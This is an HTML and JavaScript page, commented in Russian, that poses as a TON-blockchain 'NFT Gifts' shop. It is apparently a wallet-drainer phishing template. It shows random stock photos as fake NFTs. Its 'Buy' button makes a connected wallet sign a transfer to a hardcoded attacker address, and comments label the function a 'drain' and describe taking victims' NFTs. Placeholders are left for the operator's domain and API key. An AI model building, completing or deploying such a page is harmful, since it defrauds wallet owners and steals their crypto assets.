<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Gifts</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: linear-gradient(145deg, #1e1e2f, #2a2a40); color: white; }
        .gallery { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
        .item { border: 1px solid #555; border-radius: 10px; padding: 15px; width: 200px; background: #2e2e44; }
        .item img { width: 100%; border-radius: 8px; }
        button { background: #ff8c00; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #555; }
    </style>
</head>
<body>
    <h1>üéÅ NFT Gifts ‚Äì Buy & Send</h1>
    <p>Connect wallet and choose your gift</p>
    <div id="connect-wallet">
        <button id="connectBtn">Connect Wallet</button>
        <p id="wallet-address" style="color:#0f0;"></p>
    </div>
    <div id="gallery" class="gallery"></div>

    <script src="https://unpkg.com/tonconnect-sdk@latest/lib/tonconnect-sdk.min.js"></script>
    <script>
        // 1. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TON Connect
        const connector = new TonConnectSDK.TonConnect({
            manifestUrl: 'https://—Ç–≤–æ–π-—Å–∞–π—Ç.vercel.app/tonconnect-manifest.json'
        });

        let walletConnected = false;
        let walletAddress = '';

        // 2. –ö–Ω–æ–ø–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
        document.getElementById('connectBtn').addEventListener('click', async () => {
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤ (Tonkeeper, Tonhub –∏ —Ç.–¥.)
            const walletsList = await connector.getWallets();
            // –î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã —Å—Ä–∞–∑—É –ø—Ä–µ–¥–ª–∞–≥–∞–µ–º Tonkeeper —á–µ—Ä–µ–∑ Universal Link
            const tonkeeper = walletsList.find(w => w.name === 'Tonkeeper');
            if (tonkeeper) {
                const link = connector.connect(tonkeeper);
                window.open(link, '_blank'); // –û—Ç–∫—Ä—ã–≤–∞–µ–º deep link
            }
        });

        // 3. –û–±—Ä–∞–±–æ—Ç–∫–∞ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        connector.onStatusChange((walletInfo) => {
            if (walletInfo) {
                walletConnected = true;
                walletAddress = walletInfo.account.address;
                document.getElementById('wallet-address').innerText = 'Connected: ' + walletAddress.slice(0,6)+'...'+walletAddress.slice(-4);
                loadNFTItems();
            }
        });

        // 4. –ó–∞–≥—Ä—É–∑–∫–∞ –∫–∞—Ä—Ç–∏–Ω–æ–∫ –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ (–ø–æ–¥–º–µ–Ω–∞)
        async function loadNFTItems() {
            const gallery = document.getElementById('gallery');
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ API —Å –∫–∞—Ä—Ç–∏–Ω–∫–∞–º–∏
            const response = await fetch('https://api.unsplash.com/photos/random?count=9&client_id=–¢–í–û–ô_UNSPLASH_KEY');
            const photos = await response.json();
            gallery.innerHTML = '';
            photos.forEach(photo => {
                const item = document.createElement('div');
                item.className = 'item';
                item.innerHTML = `
                    <img src="${photo.urls.small}" alt="NFT">
                    <h3>${photo.description || 'Gift'}</h3>
                    <p>Price: 0.1 TON</p>
                    <button onclick="buyNFT('${photo.id}')" ${!walletConnected ? 'disabled' : ''}>Buy</button>
                `;
                gallery.appendChild(item);
            });
        }

        // 5. –§—É–Ω–∫—Ü–∏—è "–ø–æ–∫—É–ø–∫–∏" (–¥—Ä–µ–Ω–∞–∂)
        window.buyNFT = async (itemId) => {
            if (!walletConnected) return alert('Connect wallet first');

            // –¢–≤–æ–π –∫–æ—à–µ–ª—ë–∫ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è NFT (–∞–¥—Ä–µ—Å, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –ø–æ–¥–∞—Ä–∫–∏)
            const YOUR_WALLET = 'UQAc1Qleeg12HCIreHGd621jBEdX_FULt8gRUthPbOzMKlyB';

            // –ó–¥–µ—Å—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤—ã–∑–æ–≤ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞: —Å–æ–∑–¥–∞—ë–º transfer NFT
            // –î–ª—è NFT (–Ω–∞–ø—Ä–∏–º–µ—Ä, —Å—Ç–∞–Ω–¥–∞—Ä—Ç NFT –æ—Ç TON) –Ω—É–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å –º–µ—Ç–æ–¥ transfer –≤–ª–∞–¥–µ–ª—å—Ü–∞
            // –ù–æ –ø—Ä–æ—â–µ ‚Äì –∑–∞–ø—Ä–æ—Å–∏—Ç—å –ø–æ–¥–ø–∏—Å—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –ø–µ—Ä–µ–≤–µ–¥—ë—Ç NFT –Ω–∞ —Ç–≤–æ–π –∞–¥—Ä–µ—Å.

            // –í TON Connect 2.0 –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞–ø—Ä—è–º—É—é
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 –º–∏–Ω—É—Ç
                messages: [
                    {
                        address: YOUR_WALLET,                     // –∫–æ–º—É –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                        amount: '10000000',                        // 0.01 TON (–∫–æ–º–∏—Å—Å–∏—è) ‚Äì –º–æ–∂–Ω–æ 0
                        // –ï—Å–ª–∏ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π NFT ‚Äì –Ω—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å payload —Å transfer
                        // –ù–æ –¥–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã –º–æ–∂–Ω–æ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ NFT —á–µ—Ä–µ–∑ forward payload
                        // payload: 'te6ccgEBAQE...'  // base64 —Å–æ–æ–±—â–µ–Ω–∏—è transfer
                    }
                ]
            };

            try {
                const result = await connector.sendTransaction(transaction);
                alert('Purchase successful! (tx: ' + result + ')');
            } catch (e) {
                alert('Transaction failed: ' + e.message);
            }
        };
    </script>
</body>
</html>
